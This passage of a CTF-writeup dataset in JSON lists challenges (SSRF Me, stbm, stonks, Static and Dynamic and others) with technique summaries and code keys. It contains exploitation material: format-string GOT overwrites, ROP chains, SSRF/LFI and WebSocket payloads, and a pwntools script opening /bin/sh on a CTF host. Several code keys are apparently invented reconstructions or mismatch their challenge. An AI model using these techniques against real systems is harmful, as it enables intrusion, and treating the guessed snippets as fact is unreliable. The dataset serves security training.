            "When faced with a situation where direct brute-forcing of AES keys is impractical due to high entropy, but the keys have low entropy portions (e.g., only 2 bytes of meaningful data), employing a meet-in-the-middle attack can significantly reduce the complexity. Here, the process involves encrypting a known plaintext with all possible keys for half the number of encryption rounds and storing these results. Then, decrypting the ciphertext with all possible keys for the remaining rounds and looking for matches in the previously stored results. This approach can effectively reveal the encryption keys with considerably lower computational effort than brute-forcing all possible keys for the entire sequence.\n\n    - **Condition**: Works efficiently when the keys used in AES encryption have low entropy sections, and the encryption process is sequentially layered, allowing for a meet-in-the-middle strategy.\n    - **Knowledge Detail**: Implement a meet-in-the-middle attack by splitting the encryption process into two halves. First, generate a map of 2-round encrypted known plaintext to their corresponding keys. Then, decrypt the given ciphertext for 2 rounds with all possible keys and match against the stored results to find the full key sequence.",
            "Parallelization can drastically speed up the process of cryptographic brute-forcing or meet-in-the-middle attacks where computational tasks are independent and can be distributed across multiple processors. Utilizing multiple cores to run parallel instances of encryption or decryption workloads allows for the exploration of key spaces or match searching to occur in a fraction of the time it would take sequentially. This method is crucial for time-efficiently solving cryptographic challenges with high computational demands.\n\n    - **Condition**: Effective when the cryptographic challenge involves computationally intensive tasks that can be parallelized, such as generating key maps or brute-forcing keys in segments.\n    - **Knowledge Detail**: Utilize parallel processing to accelerate the meet-in-the-middle strategy by distributing the encryption and decryption tasks across several processes. The technique involves generating encryption mappings and decryption mappings concurrently, significantly reducing overall computation time. Implement parallel processing in Python using libraries or constructs that support multiprocessing, such as the `multiprocessing` module, to distribute workloads effectively across multiple CPU cores."
        ],
        "key": "```python\nfrom hashlib import md5  \nfrom base64 import b64decode  \nfrom base64 import b64encode  \nfrom Crypto.Cipher import AES  \nfrom Crypto.Random import get_random_bytes  \nfrom random import randrange  \nimport string\n\nalphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits  \niv = md5(b\"ignis\").digest()\n\nflag = \"ijctf{i am not the real flag :)}\"  \nmessage = b\"Its dangerous to solve alone, take this\" + b\"\\x00\"*9\n\nkeys = []  \nfor i in range(4):  \n   key = alphabet[randrange(0,len(alphabet))] +\nalphabet[randrange(0,len(alphabet))]  \n   keys.append(key.encode() + b'\\x00'*14)\n\nfor key in keys:  \n   cipher = AES.new(key, AES.MODE_CBC, IV=iv)  \n   flag = cipher.encrypt(flag)  \n  \nfor key in keys:  \n   cipher = AES.new(key, AES.MODE_CBC, IV=iv)  \n   message = cipher.encrypt(message)\n\nprint(f\"flag= {b64encode(flag)}\")  \nprint(f\"message= {b64encode(message)}\")  \n```"
    },
    {
        "name": "Speed-Rev_ Humans",
        "write_up": "dataset/raw/Speed-Rev_ Humans.md",
        "type": "reverse",
        "competition": [
            "HackPack/2023",
            "https://ctftime.org/event/1893/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When solving reverse engineering challenges that involve understanding and manipulating binary constraints, the Z3 Solver library can be a powerful tool for resolving Satisfiability Modulo Theories (SMT) problems. The library can be used to define variables and constraints programmatically, allowing for automated finding of input values that satisfy all given conditions to extract flags or required outputs.",
            "In reversing tasks where a solution involves determining specific character values (e.g., alphanumeric or special characters) to satisfy a set of conditions, applying additional constraints on input values to match the expected character ranges (such as lowercase letters, uppercase letters, and numbers) can significantly reduce the search space and expedite finding a correct solution. This approach is particularly effective when dealing with binary constraints that do not entirely reveal the expected character set, enabling a focused search within a defined character range.\n\nExample payload for constructing and solving a constraint problem:\n```python\nfrom z3 import *\n\ns = Solver()\n\n# Define variables\nparam = [BitVec('param_%d' % i, 8) for i in range(length)]\n\n# Example for adding binary constraints\ns.add(param[0] + param[1] == 0x8c)  # Adding a constraint\n\n# Example for adding character range constraints\nfor i in range(length):\n    s.add(Or(And(param[i] >= 48, param[i] <= 57),    # digits\n             And(param[i] >= 65, param[i] <= 90),    # uppercase A-Z\n             And(param[i] >= 97, param[i] <= 122)))  # lowercase a-z\n\n# Check and print solution\nif s.check() == sat:\n    m = s.model()\n    solution = ''.join([chr(m[param[i]].as_long()) for i in range(length)])\n    print(solution)\nelse:\n    print(\"No solution\")\n```\nThis sample outlines constructing a simple constraint problem, adding binary constraints specific to the challenge, narrowing down possible values with character range limits, and finally checking for a satisfactory solution."
        ],
        "key": "```python  \nfrom z3 import *\n\ns = Solver()\n\n# Define variables  \nparam_1 = [BitVec('param_%d' % i, 8) for i in range(16)]\n\n# Add constraints  \ns.add(param_1[1] + param_1[0] == 0x8c)  \ns.add(param_1[2] + param_1[1] == 0xa2)  \ns.add(param_1[3] + param_1[2] == 0xb0)  \ns.add(param_1[4] + param_1[3] == 0x8f)  \ns.add(param_1[5] + param_1[4] == 0xc2)  \ns.add(param_1[6] + param_1[5] == 0xda)  \ns.add(param_1[7] + param_1[6] == 0x93)  \ns.add(param_1[8] + param_1[7] == 0x92)  \ns.add(param_1[9] + param_1[8] == 0x96)  \ns.add(param_1[10] + param_1[9] == 0x68)  \ns.add(param_1[11] + param_1[10] == 0x6b)  \ns.add(param_1[12] + param_1[11] == 0xa1)  \ns.add(param_1[13] + param_1[12] == 0xbc)  \ns.add(param_1[14] + param_1[13] == 0xa3)  \ns.add(param_1[15] + param_1[14] == 0x9a)\n\n# Add additional constraints for lowercase letters, uppercase letters, and\nnumbers  \nfor i in range(16):  \n   s.add(Or(And(param_1[i] >= 48, param_1[i] <= 57),  # numbers  \n            And(param_1[i] >= 65, param_1[i] <= 90),  # uppercase letters  \n            And(param_1[i] >= 97, param_1[i] <= 122)))  # lowercase letters\n\n# Check if the constraints are satisfiable and print the solution if it exists  \nif s.check() == sat:  \n   m = s.model()  \n   decoded_message = ''  \n   for i in range(16):  \n       char_value = m[param_1[i]].as_long()  \n       decoded_message += chr(char_value)  \n   print(decoded_message)  \nelse:  \n   print(\"unsatisfiable\")  \n```"
    },
    {
        "name": "speedrun 00-17",
        "write_up": "dataset/raw/speedrun 00-17.md",
        "type": "crypto",
        "competition": [
            "Sunshine/2020",
            "https://ctftime.org/event/992/tasks/"
        ],
        "score": -1,
        "max_score": 700,
        "difficulty": -1,
        "knowledge": [
            "When a binary contains a format string vulnerability due to a `printf` function lacking a proper format string (e.g., `printf(buffer);`), it can be exploited to achieve a write-what-where condition. This can be utilised to modify the Global Offset Table (GOT) entries for code redirection. To exploit this vulnerability, one can use a tool like `fmtstr_payload` from pwntools to generate a payload that overwrites a GOT entry with the address of a desired function, such as `system`.",
            "In challenges where the executable uses `rand()` seeded with the current time (e.g., `srand(time(NULL)); rand();`), the output of `rand()` can be predicted if the execution time of the program is known. This is because `rand()` is deterministic, and seeding it with the current time means that the sequence of random numbers it produces can be reproduced if the seed (time) is known. To exploit this, one can write a script (in C, Python with ctypes, etc.) that seeds `rand()` with the current UTC time and then calls `rand()` to predict the value the challenge program will generate. This approach is particularly effective if the server's and attacker's times are synchronized or if the time can be precisely guessed."
        ],
        "key": "```c\nvoid main(void)  \n{  \n char local_48 [56];  \n int local_10;  \n int local_c;  \n  \n puts(\"This is the only one\");  \n gets(local_48);  \n if (local_c == 0xfacade) {  \n   system(\"/bin/sh\");  \n }  \n if (local_10 == 0xfacade) {  \n   system(\"/bin/sh\");  \n }  \n return;  \n}\n```"
    },
    {
        "name": "speedrun-4",
        "write_up": "dataset/raw/speedrun-4.md",
        "type": "web",
        "competition": [
            "BlueHens/2021",
            "https://ctftime.org/event/1298/tasks/"
        ],
        "score": 328,
        "max_score": 500,
        "difficulty": 0.656,
        "knowledge": [
            "When monitoring WebSocket traffic using tools like BurpSuite for a web-based CTF challenge, observe the outgoing messages for patterns, especially those indicating interactions with backend services such as database queries or specific endpoint requests. This might reveal how the application structures its requests, potentially allowing an attacker to craft malicious payloads targeting these endpoints.\n   - Example payload for querying a different endpoint: `{\"t\":\"d\",\"d\":{\"r\":1,\"a\":\"q\",\"b\":{\"p\":\"/desired_endpoint\",\"h\":\"\"}}}`",
            "In scenarios where the application is observed to make sequential or structured requests over WebSockets (e.g., querying database records), altering the payloads of these requests can lead to access to unauthorized or hidden information such as flag data. This can be particularly effective if the system does not validate or restrict access to sensitive endpoints or data thoroughly.\n   - Modified payload to access a flag: `{\"t\":\"d\",\"d\":{\"r\":1,\"a\":\"q\",\"b\":{\"p\":\"/flag\",\"h\":\"\"}}}`"
        ],
        "key": "```python\n# Possible vulnerable code snippet based on the context\n\ndef handle_request(request):\n    # Simulating a request handler for WebSocket messages\n    if request['a'] == 'q':\n        path = request['b']['p']\n        if path == '/flag':\n            return {\"t\": \"d\", \"d\": {\"b\": {\"p\": \"flag\", \"d\": \"UDCTF{l34rn_d4t4b4s3_rul3s}\"}, \"a\": \"d\"}}\n        else:\n            return {\"t\": \"d\", \"d\": {\"b\": {\"p\": path, \"d\": \"No data available\"}, \"a\": \"d\"}}\n    return {\"t\": \"d\", \"d\": {\"b\": {\"p\": \"unknown\", \"d\": \"Invalid request\"}, \"a\": \"d\"}}\n\n# Example of a WebSocket message\nrequest_message = {\"t\": \"d\", \"d\": {\"r\": 2, \"a\": \"q\", \"b\": {\"p\": \"/flag\", \"h\": \"\"}}}\nresponse = handle_request(request_message)\nprint(response)\n```\n"
    },
    {
        "name": "SPlaid Birch",
        "write_up": "dataset/raw/SPlaid Birch.md",
        "type": "misc",
        "competition": [
            "PlaidCTF/2019",
            "https://ctftime.org/event/743/tasks/"
        ],
        "score": 300,
        "max_score": 666,
        "difficulty": 0.45045045045045046,
        "knowledge": [
            "In pwnable challenges where the program involves complex data structures like trees and has an out-of-bounds (OOB) write vulnerability, crafting payloads that manipulate heap metadata or program control flow can be feasible. Specifically, if an application incorrectly processes tree node pointers, it's possible to forge a tree node structure on the heap to gain arbitrary code execution or leak information. Manipulating tree structures by exploiting OOB writes can allow for redirection of program execution flow or disclosure of sensitive information such as heap or libc addresses.",
            "For pwnable challenges involving C++ applications, understanding and exploiting Use-After-Free (UAF) vulnerabilities in conjunction with C++ specific structures such as `std::vector` and `std::basic_string` can lead to arbitrary code execution. This often involves manipulating object lifetimes and heap layout to trigger the vulnerability and gain control over the application. By carefully crafting payloads that exploit UAF vulnerabilities, it's possible to hijack control flow or corrupt memory to achieve code execution or leak sensitive data. This requires a deep understanding of the binary's heap management and the specifics of how C++ objects are allocated, initialized, copied, and destroyed."
        ],
        "key": "```c\n__int64 __fastcall select(manager *a1, __int64 a2)  \n{  \n data *v2; // rbx\n\n v2 = a1->buf[a2];                             // oob  \n sp_select(a1, &v2->btent);  \n return v2->var3;  \n}\n\n__int64 __fastcall sp_select(manager *a1, btnode *a2)  \n{  \n __int64 result; // rax\n\n result = (__int64)sub_894(a2, a1->some_calc);  \n a1->root = (btnode *)result;  \n return result;  \n}\n\nbtnode *__fastcall sub_894(btnode *cur, void (__fastcall *a2)(btnode *))  \n{  \n btnode *cur_; // rbx  \n btnode *v3; // rdi  \n btnode *v4; // rax\n\n cur_ = cur;  \n if ( !cur )  \n   return cur_;  \n v3 = cur->parent;  \n if ( !v3 ) //want this to be true, so `cur` will be returned directly  \n   return cur_;  \n//remaining part is not important  \n}\n```"
    },
    {
        "name": "SSRF Me",
        "write_up": "dataset/raw/SSRF Me.md",
        "type": "This is a **web** challenge.",
        "competition": [
            "De1CTF/2019",
            "https://ctftime.org/event/843/tasks/"
        ],
        "score": 79,
        "max_score": 952,
        "difficulty": 0.08298319327731092,
        "knowledge": [
            "In SSRF challenges where the application logic separates actions but partially checks the action string enabling multiple actions to be executed with careful string manipulation, attackers can append or prepend the string to perform unintended actions. Specifically, if the system checks for an action by searching for a substring (`\"scan\"` in the action string) rather than matching the entire string, by crafting action values that contain the required substring along with additional text (`\"readscan\"`), both actions (`\"read\"` and `\"scan\"`) can be executed in a single request. This technique allows for bypassing restrictions or expected flow in web applications.\n    - Example payload: \n        - Action value: `\"readscan\"`\n        - Parameter value for generating sign: `\"flag.txtread\"`\n        - Final Parameter value: `\"flag.txt\"`",
            "SSRF (Server-Side Request Forgery) vulnerabilities can be exploited to perform local file inclusion (LFI) even when direct protocol prefixes such as `\"file://\"` are blocked. If the application appends user input (such as a file name) directly into file paths or URLs without proper validation, just using a file name (`\"flag.txt\"`) without a protocol can cause the application to access local files. This can be particularly useful when the application logic is designed to fetch resources based on URLs or file paths constructed with user input, and when direct access to file or gopher protocols is restricted.\n    - Example payload for reading local files bypassing protocol restrictions: `\"flag.txt\"` (without `\"file://\"` prefix)"
        ],
        "key": "```python\ndef scan(param):  \n    socket.setdefaulttimeout(1)   \n    try:   \n        return urllib.urlopen(param).read()[:50]   \n    except:   \n        return \"Connection Timeout\"   \n```"
    },
    {
        "name": "SSSP",
        "write_up": "dataset/raw/SSSP.md",
        "type": "crypto",
        "competition": [
            "HITCON/2017/Quals",
            "https://ctftime.org/event/485/tasks/"
        ],
        "score": 400,
        "max_score": 450,
        "difficulty": 0.8888888888888888,
        "knowledge": [
            "When dealing with challenges that utilize a predictable pseudorandom number generator (PRNG) like MT19937, it is possible to reconstruct the PRNG state incrementally from its outputs, especially if these outputs are part of the data used in the challenge (e.g., integers in a Subset sum problem). This approach can be refined by modeling the PRNG as an unbounded length array, where each entry contains all possible values at that point under certain constraints, thus gradually narrowing down the possibilities and recovering the full state. This technique is particularly applicable in scenarios where direct seed recovery is not feasible due to the use of secure RNG sources for initialization or when the outputs are not sequentially sorted.",
            "For Subset sum problems that become computationally infeasible due to the size or time constraints, one can apply heuristic approaches to reduce the problem's complexity. This involves identifying and removing a subset of the problem that has minimal impact on finding a correct solution but significantly lowers the computational effort required. Although this may reduce the probability of finding a valid solution in a single attempt, it allows for the application of a feasible brute-force approach by repeatedly attempting to solve the reduced problem until a solution is found. This method is beneficial in challenges where solving the entire problem set within the given constraints is impractical, and a small margin of error in the solution space is acceptable. \n\nSample heuristic reduction approach: In a challenge scenario with a Subset sum problem initially containing 63 numbers, reducing the problem size to 43 by omitting the last 20 numbers to meet time constraints."
        ],
        "key": "```cpp\n#include <iostream>\n#include <random>\n#include <vector>\n\nint main() {\n    std::random_device rd;\n    std::mt19937 mt(rd());\n    std::vector<int> problem_set;\n\n    for (int i = 0; i < 127; ++i) {\n        int num = mt() & ((1 << (24 + (i % 97))) - 1); // Vulnerable: varying bit length\n        problem_set.push_back(num);\n    }\n\n    // Simulate subset sum problem\n    int target = mt() & ((1 << 120) - 1); // Vulnerable: target with high bit length\n    std::cout << \"Target: \" << target << std::endl;\n\n    // Output the problem set\n    for (int num : problem_set) {\n        std::cout << num << \" \";\n    }\n    std::cout << std::endl;\n\n    return 0;\n}\n```"
    },
    {
        "name": "Static and Dynamic",
        "write_up": "dataset/raw/Static and Dynamic.md",
        "type": "reverse",
        "competition": [
            "HacktivityCon/2020",
            "https://ctftime.org/event/1101/tasks/"
        ],
        "score": 100,
        "max_score": 400,
        "difficulty": 0.25,
        "knowledge": [
            "When conducting a buffer overflow attack in a challenge where NX (Non-Executable Stack) is enabled, and `mprotect()` or similar functions are present in the binary, the function can be used to change permissions of a memory region to executable. This allows for the injection and execution of shellcode on the stack. A ROP chain can be crafted to call `mprotect()` with appropriate arguments to make the stack executable, thereby bypassing NX protections. The specific scenario includes challenges where direct shellcode execution on the stack is initially prevented by NX. \n   \nExample payload components (abstracted for general understanding):\n   - Find gadgets: `pop_rdi_ret`, `pop_rsi_ret`, `pop_rdx_ret` for setting up the `mprotect()` arguments (memory address, size, protection mode).\n   - Use a gadget or function like `_dl_make_stack_executable` to change stack memory protection.\n   - Place shellcode on the stack or a known writable and now executable area.\n   - Jump to the shellcode using a `jmp rsp` gadget or similar.",
            "In scenarios where a binary has Partial RELRO enabled and exposes global variables like `__stack_prot`, one can directly manipulate these variables through a ROP chain to modify stack permissions or other security features. This approach is viable when specific symbols like `__stack_prot` are writable and the challenge binary has symbols or functions that interact with these global variables to alter memory protections or other security mechanisms.\n   \nExample abstracted explanation for modifying `__stack_prot`:\n   - Use ROP gadgets to write the desired value (`0x7` for RWX permissions) to `__stack_prot`.\n   - Call a function that uses the altered `__stack_prot` value to change memory protections, such as `_dl_make_stack_executable`.\n   - This bypasses the protection and allows executing custom shellcode placed on the stack or other manipulated memory regions."
        ],
        "key": "```c\nulong _dl_make_stack_executable(ulong *param_1)\n\n{  \n int iVar1;  \n undefined4 extraout_var;  \n long in_FS_OFFSET;  \n  \n iVar1 = mprotect((void *)(-_dl_pagesize &\n*param_1),_dl_pagesize,__stack_prot);  \n if (iVar1 == 0) {  \n   *param_1 = 0;  \n   _dl_stack_flags = _dl_stack_flags | 1;  \n   return CONCAT44(extraout_var,iVar1);  \n }  \n return (ulong)*(uint *)(in_FS_OFFSET + -0x40);  \n}  \n```"
    },
    {
        "name": "stbm",
        "write_up": "dataset/raw/stbm.md",
        "type": "pwn",
        "competition": [
            "Hackover/2018",
            "https://ctftime.org/event/689/tasks/"
        ],
        "score": 484,
        "max_score": 500,
        "difficulty": 0.968,
        "knowledge": [
            "In a challenge involving manipulation of function context or environment variables, examine the application's source code for functions that use dynamic execution methods such as `Kernel.system` or dynamic variable setting methods like `local_variable_set`. If you can control the input or parameters that interact with these methods, you can potentially execute arbitrary commands or manipulate the application behavior. This is especially relevant in scenarios where the application dynamically executes commands based on user input or parameters.\n   - Example payload: To execute a shell command, if you find a method that allows injecting command via parameters (and you can control these parameters), you might be able to execute: `update test context=Kernel checksum=555 password=lol` followed by `system '/bin/sh'`.",
            "When faced with a challenge where direct command execution doesn't work as expected (e.g., hangs because it awaits further input or doesn't interpret the command correctly), consider utilizing a shell to bypass the limitation. Dropping into a shell (`/bin/sh`) can provide a direct interface to the system, allowing for more complex interactions like reading files directly or executing a series of commands that wouldn't be possible through the initially exposed interface.\n   - Example to read a file directly when command execution is limited: First, inject into a context that allows executing system commands, then use `system '/bin/sh'` to drop into a shell. From the shell, you can directly `cat` files or execute other commands without the limitations imposed by the original application's command parsing.\n   - Python automation snippet with `pwntools`:\n     ```python\n     from pwn import *\n\n     r = remote('stbm.ctf.hackover.de', 1337)\n\n     r.send(\"switch_module FirmwareCommands\\n\")  \n     r.send(\"update test context=Kernel checksum=555 password=lol\\n\")  \n     r.send(\"system /bin/sh\\n\")  \n     r.interactive()\n     ```"
        ],
        "key": "```ruby\ndef update(new_firmware, options)  \n update_password = File.read(\"flag.txt\")\n\n decoded_firmware = Base64.decode64(new_firmware)  \n firmware_checksum = Digest::MD5.hexdigest(decoded_firmware)\n\n firmware_valid = firmware_checksum == options.local_variable_get(:checksum)  \n password_correct = (  \n   Digest::MD5.hexdigest(update_password) ==  \n   Digest::MD5.hexdigest(\"HO18CTF-#{options.local_variable_get(:password)}\")  \n )  \n sleep(rand + 1.0)\n\n if firmware_valid && password_correct  \n   File.open(\"#{__FILE__}.new\", \"w\") do |file|  \n     file.puts new_firmware  \n   end  \n   log \"Firmware Update! Please issue reboot command via SystemCommands\nmodule.\"  \n else  \n   log \"Checksum Invalid or Password incorrect! Can't update Firmware.\"  \n end  \nend  \n\n# (...)\n\nif\n(/(?<command_name>[^\\s]+)\\s*(?<parameter>[^\\s]+)?\\s*((?<option_name>[^\\s]+)=(?<option_value>[^\\s]+))?/i\n=~ input) && command =\nKernel.const_get(context).singleton_method(command_name)  \n case  \n when parameter && option_name  \n   raise ArgumentError, \"command doesn't take options\" if\ncommand.parameters.count < 2  \n   options = binding\n\n   input.scan(/((?<option_name>[^\\s]+)=(?<option_value>[^\\s]+))/i) do\n|(option, value)|  \n     options.local_variable_set(option, value)  \n   end\n\n   command.call(parameter, options)  \n when parameter  \n   command.call(parameter)  \n else  \n   command.call  \n end  \nelse  \n raise NameError, \"<none>\"  \nend  \n\n# (...)\n\ndef switch_module(module_name)  \n if VALID_MODULES.include?(module_name)  \n   ROOT_MODULE.local_variable_set :context, module_name  \n else  \n   log \"Invalid Module: #{module_name}\"\n\n   CommonCommands.available_modules  \n end  \nend  \n```"
    },
    {
        "name": "steg0",
        "write_up": "dataset/raw/steg0.md",
        "type": "This is a **forensics** challenge.",
        "competition": [
            "Hack.lu/2018",
            "https://ctftime.org/event/699/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When analyzing a zip file for potential hidden or encrypted data, the usage of tools like GNU strings can be an effective methodology for extracting plaintext data or comments that may contain clues or direct information related to the challenge. These elements can sometimes be overlooked when focusing solely on the file's main content. This approach is beneficial in scenarios where the challenge includes encrypted files or data obfuscation.",
            "The existence of a ZIP file comment (\"there_is_no_flag\") demonstrates the potential use of file metadata or appended data segments as a vector for hiding messages or red herrings. This method can be applied in challenges where the solution seems obscured by encryption or when the file appears to contain random data. Attention to all components of a file, including metadata and file comments, is crucial in uncovering all possible hints or misdirections implemented by challenge designers."
        ],
        "key": "```bash\n#!/bin/sh  \n  \n# /dev/urandom  \ndd if=/dev/urandom of=steg0.dat bs=1M count=32  \nsha512sum steg0.dat > steg0.shasum  \n  \n# tar  \ntar cfv steg0.tar steg0.dat  \n  \n# bzip2  \nbzip2 steg0.tar  \n  \n# sfx  \n7z a -sfx steg0.sfx steg0.tar.bz2  \n  \n# rename  \nmv steg0.tar.bz2 steg0.jpg  \n  \n# zip (pw+comment: there_is_no_flag)  \necho 'there_is_no_flag' | zip -Pe steg0.zip steg0.jpg steg0.shasum  \necho 'there_is_no_flag' | zip -z steg0.zip  \n  \n## ----  \n  \n# FLAG  \nFLAG=\"$(dd if=/dev/urandom bs=1M count=1 of=- | sha512sum)\"  \n#\ncf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e  \n```"
    },
    {
        "name": "stegasaurus scratch",
        "write_up": "dataset/raw/stegasaurus scratch.md",
        "type": "The type of CTF challenges described in the write-up is **crypto**.",
        "competition": [
            "PlaidCTF/2020",
            "https://ctftime.org/event/936/tasks/"
        ],
        "score": 150,
        "max_score": 550,
        "difficulty": 0.2727272727272727,
        "knowledge": [
            "For challenges involving reconstructing a sequence or identifying a missing element without direct communication, utilizing mathematical properties of the sequence can be effective. Specifically, when the sequence involves a limited range of numbers and a restricted number of elements, encoding the missing element's information by combining permuted elements and a calculated value based on known constraints allows for efficient data transmission without explicit communication. For example, in scenarios where elements are from a fixed numerical range and one is missing, representing the missing element with a combination of its possible quotient within the range and its remainder or positional value in a sorted version of the sequence can streamline the identification process.",
            "In challenges that involve arrays with a specific composition of elements and the task is to deduce the original arrangement of these elements based on partial information, the solution can hinge on identifying patterns or rules that must hold true in the array's construction. For example, when an array is composed of a fixed number of different elements in a pattern (like a fixed number of 1s and 2s), focusing on the inevitable interaction between these elements (such as a 1 must be adjacent to a 2) allows for the reconstruction of the original array by systematically applying this rule to deduce the positions of elements based on partial cues provided, treating the array as a cyclical entity to ensure all scenarios are covered."
        ],
        "key": "```python\ndef alice_part1(numbers):\n    sorted_numbers = sorted(numbers)\n    discarded = sorted_numbers.pop()  # Discard the largest number\n    permutation = sorted_numbers  # Send the rest as a permutation\n    return permutation, discarded\n\ndef bob_part1(permutation):\n    # Bob receives the permutation and needs to find the discarded number\n    # Assume he knows the original range and can calculate the missing number\n    full_set = set(range(40001))  # All possible numbers\n    received_set = set(permutation)\n    discarded = full_set - received_set  # Find the missing number\n    return discarded.pop()\n```"
    },
    {
        "name": "Stellar Radiation 2",
        "write_up": "dataset/raw/Stellar Radiation 2.md",
        "type": "web",
        "competition": [
            "LedgerDonjon/2021",
            "https://ctftime.org/event/1516/tasks/"
        ],
        "score": 200,
        "max_score": 400,
        "difficulty": 0.5,
        "knowledge": [
            "When faced with a challenge that involves creating a valid message for cryptographic operations (e.g., SHA-256 hash) where the output must meet specific criteria (such as being completely printable ASCII characters), one can utilize GPUs to efficiently brute force a wide range of inputs. This approach takes advantage of the massive parallel processing power of GPUs to perform a high number of hash calculations quickly, iterating through possible inputs until finding one that produces a hash meeting the criteria. This is particularly useful in situations where the probability of success for any given input is extremely low, as in the case where the output must consist only of printable characters.",
            "In a challenge that requires interacting with a blockchain or digital ledger technology (such as Stellar in this case), where the task involves generating transactions that must be signed with a secret key, an alternative approach can be used if direct access to sign transactions is not permitted. If the challenge allows for sending a short, arbitrary piece of data to be signed (under certain conditions, like length or character restrictions), one can craft a payload that, when signed, fulfills the requirements of the blockchain transaction. This involves careful preparation of the data to be signed to ensure it is a valid part of a transaction according to the blockchain's protocol, leveraging any server-side functionality that signs data on behalf of the user. \n\nSample Payload for signing a transaction with specific criteria:\n```\ncurl -X POST http://stellar-radiation.donjon-ctf.io:25520/publickey -d 'proof=XM>iUQ9i9~b[*nT{x3!<Rpt%20%0C@o0XBj@'\n```\nThis sends a request to a server endpoint to sign a piece of data (`proof`) that, when signed, can be used as part of a blockchain transaction. The signed data is then utilized to fulfill the challenge's requirement, in this case, by embedding it within a Stellar transaction and submitting it for validation."
        ],
        "key": "```python\n@routes.post(\"/publickey\")  \nasync def public_key(request: web.Request):  \n   data = await request.post()  \n   public_keys = set()\n\n   # Detect Stellar radiations  \n   for _ in range(MAX_TRIES):  \n       public_keys.add(Keypair.from_secret(STELLAR_SECRET).public_key)  \n       if len(public_keys) > 1:  \n           return web.Response(status=500)\n\n   sk = Keypair.from_secret(STELLAR_SECRET).signing_key  \n   if \"proof\" in data:  \n       # Sign a short \"proof\" message so that client can verify public key is valid,  \n       # in case previous check was not enough.  \n       # Proof must be short, printable messages.  \n       proof = data[\"proof\"]  \n       if len(proof) > MAX_PROOF_SIZE or not all(c in string.printable for c in proof):  \n           return web.Response(status=500, body=\"Invalid proof requested\")  \n       signed_message = sk.sign(proof.encode())  \n       return web.json_response(  \n           {  \n               \"public_key\": public_keys.pop(),  \n               \"signature\": signed_message.signature.hex(),  \n           }  \n       )  \n   else:  \n       return web.json_response({\"public_key\": public_keys.pop()})\n```"
    },
    {
        "name": "Stephanie Wehner",
        "write_up": "dataset/raw/Stephanie Wehner.md",
        "type": "crypto",
        "competition": [
            "CyberHeroines/2023",
            "https://ctftime.org/event/2054/tasks/"
        ],
        "score": 300,
        "max_score": 400,
        "difficulty": 0.75,
        "knowledge": [
            "When analyzing a memory dump challenge, especially when investigating application behavior such as notepad, using tools like Volatility for memory analysis can identify processes and extract relevant information. To filter for specific applications, commands such as `python3 vol.py -f [memory_dump_file] windows.pslist.PsList | Select-String [application_name]` can be utilized. Here, the goal is to list all running processes and filter for the application of interest (e.g., notepad) to obtain its PID. This approach allows for targeted investigation within memory dumps. \n   \n    Example command: `python3 vol.py -f memory_dump.vmem windows.pslist.PsList | Select-String notepad`",
            "To extract readable strings from process memory dumps and identify potentially hidden or disguised content (such as a flag), the `strings` utility can be combined with filtering commands like `grep` or `Select-String` in a Unix-like or Windows environment, respectively. This can be particularly effective in scenarios where direct searches may lead to false leads or decoy data. Adding context to search results (e.g., with `-B` option in `grep` to show lines before the match) can reveal additional clues or the actual flag hidden near misleading or dummy flags.\n\n    Example command: `strings -e l pid2452.dmp | grep \"chctf\" -B 10`"
        ],
        "key": "```python\ndef process_input(user_input):\n    buffer = [0] * 10\n    for i in range(len(user_input)):\n        buffer[i] = user_input[i]\n    return buffer\n\nuser_input = input(\"Enter data: \")\nprocess_input(user_input)\n```\n"
    },
    {
        "name": "stonks",
        "write_up": "dataset/raw/stonks.md",
        "type": "pwn",
        "competition": [
            "HSCTF/2021",
            "https://ctftime.org/event/1264/tasks/"
        ],
        "score": 391,
        "max_score": 493,
        "difficulty": 0.7931034482758621,
        "knowledge": [
            "When encountering a straightforward buffer overflow vulnerability in a CTF challenge, tools like [autorop](https://github.com/mariuszskon/autorop) can automate the exploitation process by generating the necessary code to gain access to a shell or execute arbitrary code. These tools handle typical exploit stages such as finding the offset to the return address, leaking function addresses to bypass ASLR, searching for a suitable libc version based on leaked addresses, and executing a system shell. This approach is particularly beneficial for beginners or those who prefer a quick exploitation route.",
            "In scenarios where manual identification of buffer overflow vulnerability offsets and gadget chains is infeasible or too time-consuming, leveraging gadget finding and ROP (Return-Oriented Programming) chain constructing features of automated tools can significantly expedite the exploitation process. After establishing a connection to the vulnerable service, these tools can dynamically analyze the binary to identify useful gadgets, calculate buffer overflow offsets, leak function addresses for libc version identification, and finally, automate the ROP chain creation to spawn a shell. This method hinges on the availability of partial RELRO, no canary, NX enabled, no PIE, or similar binary protections that don't completely mitigate buffer overflow exploitation but do require a precise ROP chain to exploit.\n\nExample payload (constructed by the automated tool, specific bytes and addresses may differ depending on the scenario):\n```\n0x0000:         0x40101a ret  \n0x0008:         0x401363 pop rdi; ret  \n0x0010:         0x404018 [arg0] rdi = got.puts  \n0x0018:         0x401094 puts  \n0x0020:         0x40101a ret  \n0x0028:         0x401363 pop rdi; ret  \n0x0030:   0x7f8750a425aa [arg0] rdi = 140219150247338  \n0x0038:         0x4010a4 system  \n```\nThis payload sequence demonstrates the process of leaking addresses (such as the address of `puts`) and then using these addresses along with other gadgets to call `system(\"/bin/sh\")` for an interactive shell."
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nvoid get_stock_prediction() {\n    char buffer[32];\n    printf(\"Please enter the stock ticker symbol: \");\n    gets(buffer); // Vulnerable function\n    printf(\"%s will increase by $6 today!\\n\", buffer);\n}\n\nint main() {\n    get_stock_prediction();\n    return 0;\n}\n```"
    },
    {
        "name": "storagespace",
        "write_up": "dataset/raw/storagespace.md",
        "type": "crypto",
        "competition": [
            "FacebookCTF/2019",
            "https://ctftime.org/event/781/tasks/"
        ],
        "score": 919,
        "max_score": 1000,
        "difficulty": 0.919,
        "knowledge": [
